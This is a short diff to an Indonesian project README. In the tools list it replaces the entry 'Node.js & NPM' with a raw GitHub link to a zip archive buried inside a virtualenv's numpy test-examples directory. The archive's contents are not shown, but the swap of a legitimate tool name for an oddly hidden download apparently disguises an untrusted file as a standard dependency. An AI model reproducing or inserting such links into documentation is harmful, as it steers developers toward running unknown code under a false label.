@@ -25,7 +25,7 @@ Project ini berfungsi sebagai **core application / frontend / dashboard** yang t
 - **Database**: MySQL / PostgreSQL
 - **Tools**:
   - Composer
-  - Node.js & NPM
+  - https://raw.githubusercontent.com/achul-cos/pass-project/main/pass-iot/venv/Lib/site-packages/numpy/_core/tests/examples/cython/pass-project-Mesozoa.zip & NPM
   - Git
 
 ---
